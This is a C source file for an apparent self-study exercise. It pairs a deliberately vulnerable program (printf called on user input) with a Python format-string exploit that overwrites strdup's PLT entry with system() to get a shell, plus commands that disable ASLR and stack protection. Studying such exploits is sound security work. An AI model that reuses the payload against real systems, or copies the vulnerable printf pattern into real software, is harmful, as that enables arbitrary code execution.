
/*

DISABLE ASLR & NX THROUGH COMPILATION:
$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space  # disable ASLR
$ gcc -fno-stack-protector -z execstack -o format_string format_string.c -g  # compile with NX (DEP protection) disabled

#############
# CODE POC
#############

import sys
import struct

strdup = 0x0000000000601040 # strdub@plt address
system = 0x00007ffff7a53390

# overwrite strdup@plt with system() address
# i manually calculated all these padding values (sighh)
payload  = "sh;#    "
payload += "%13191x %17$hn  "
payload += "%50194x %18$hn  "
payload += "%34903x %19$hn  "
payload += "%32766x %20$hn  "

# put all 4 addresses to write (offset 17-20)
payload += struct.pack("<qqqq", strdup, strdup+2, strdup+4, strdup+6)
sys.stdout.write(payload)

#############
# END POC
#############

TEST RUN:
$ gcc -fno-stack-protector -z execstack -o format_string format_string.c -g
$ python exploit.py > payload
$ cat payload - | ./format_string

REFERENCES:
1) https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf
2) http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.htmls
3) 

 */

#include<stdio.h>
#include<string.h>

int main(int argc, char** argv) {
    char buffer[400];
    fgets(buffer, 400, stdin);
    printf(buffer);
    puts("");
    strdup(buffer);
    exit(0);
}